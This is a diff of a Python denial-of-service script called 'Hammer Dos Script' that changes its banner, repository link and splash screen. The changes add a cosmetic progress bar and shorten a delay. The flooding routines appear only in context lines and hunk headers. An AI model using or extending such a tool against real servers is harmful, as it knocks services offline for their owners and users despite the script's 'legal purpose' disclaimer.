@@ -1,14 +1,17 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-# python 3.3.2+ Hammer Dos Script v.1
-# only for legal purpose
-# github.com/cybsam
-
+##########################################
+#! /usr/bin/python3                      #
+# -=- coding: utf-8 -=-                  #
+#                                        #
+# python 3.3.2+ Hammer Dos Script v.1    #
+# by cybsam                              #
+# only for legal purpose                 #
+# https://github.com/cybsam/web-hammer   #
+##########################################
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time,sys,os,socket,threading,logging,urllib.request,random
+
 
 def user_agent():
 	global uagent
@@ -75,7 +78,7 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.sam-web.tk/cybsam/hammer/
+	print (''' \033[92m	Hammer Dos Script v.1 https://github.com/cybsam/web-hammer/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
 	usage : python3 hammer.py [-s] [-p] [-t]
@@ -84,6 +87,24 @@ def usage():
 	-p : port default 80
 	-t : turbo default 135 \033[0m''')
 	sys.exit()
+
+
+def samHead():
+	os.system("clear")
+	print("")
+	os.system("figlet CybSam Script")
+	print("")
+	print("[ Hammering...       ]")
+	print("[                    ] 0% ")
+	time.sleep(1)
+	print("[=====               ] 25%")
+	time.sleep(1)
+	print("[==========          ] 50%")
+	time.sleep(0.75)
+	print("[===============     ] 75%")
+	time.sleep(0.50)
+	print("[====================] 100%")
+	time.sleep(0.25)
 
 
 def get_parameters():
@@ -131,9 +152,10 @@ if __name__ == '__main__':
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
+	samHead()
 	user_agent()
 	my_bots()
-	time.sleep(5)
+	time.sleep(3)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
